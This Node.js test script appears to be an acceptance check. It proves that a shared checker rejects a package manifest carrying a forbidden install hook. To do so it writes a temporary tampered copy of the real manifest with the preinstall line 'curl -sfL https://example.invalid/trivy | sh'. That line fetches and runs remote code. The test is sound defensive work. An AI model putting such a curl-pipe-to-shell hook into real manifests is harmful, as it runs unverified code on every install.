'use strict';
// AC-AI-37-07 — negative proof that the check AC-AI-37-06 runs rejects a
// manifest carrying a forbidden install lifecycle script (the vector by which
// a Trivy binary could be fetched outside the pinned, checksum-verified path
// required by AI-37-R03).
//
// The REAL root and web manifests are read from disk; a COPY is tampered and
// re-read through the same predicate AC-AI-37-06 uses. The files on disk are
// never written. Run outside the repository the sources are missing, so the
// script exits 2 (operational) rather than 1 (finding) — it cannot pass by
// accident in an empty directory.
//
// The rule is NOT restated here. It is required from ./lib/lifecycle-forbidden.js,
// the same module ac-37-06-lifecycle-clean.js requires: the negative proof now
// exercises the positive row's check rather than a private copy of it.
const fs = require('fs');
const os = require('os');
const path = require('path');
const { findForbiddenLifecycleScripts } = require('./lib/lifecycle-forbidden.js');

const SOURCES = ['package.json', path.join('apps', 'web', 'package.json')];

const loaded = [];
for (const source of SOURCES) {
  if (!fs.existsSync(source)) {
    console.error('SOURCE_MISSING: ' + source.split(path.sep).join('/'));
    process.exit(2);
  }
  try {
    loaded.push({ source, manifest: JSON.parse(fs.readFileSync(source, 'utf8')) });
  } catch (err) {
    console.error('SOURCE_UNREADABLE: ' + source + ': ' + err.message);
    process.exit(2);
  }
}

// Control: the real manifests must be clean, or the tampered copy proves nothing.
for (const { source, manifest } of loaded) {
  if (findForbiddenLifecycleScripts(manifest).length > 0) {
    console.error('CONTROL_FAILED: ' + source + ' already carries a forbidden lifecycle script');
    process.exit(2);
  }
}

// Tamper a copy of the REAL root manifest, on disk, in a temporary location.
const real = loaded[0].manifest;
const tampered = JSON.parse(JSON.stringify(real));
tampered.scripts = Object.assign({}, tampered.scripts, {
  preinstall: 'curl -sfL https://example.invalid/trivy | sh',
});

const tmp = path.join(os.tmpdir(), 'shipde-ac-37-07-' + process.pid + '-package.json');
let found;
try {
  fs.writeFileSync(tmp, JSON.stringify(tampered, null, 2));
  found = findForbiddenLifecycleScripts(JSON.parse(fs.readFileSync(tmp, 'utf8')));
} catch (err) {
  console.error('TAMPER_COPY_FAILED: ' + err.message);
  process.exit(2);
} finally {
  try {
    fs.unlinkSync(tmp);
  } catch {}
}

if (found.length === 0) {
  console.error('FORBIDDEN_SCRIPT_NOT_DETECTED: the check failed to reject the tampered manifest');
  process.exit(0);
}

console.error('FORBIDDEN_LIFECYCLE_SCRIPT: detected ' + found.join(', '));
process.exit(1);
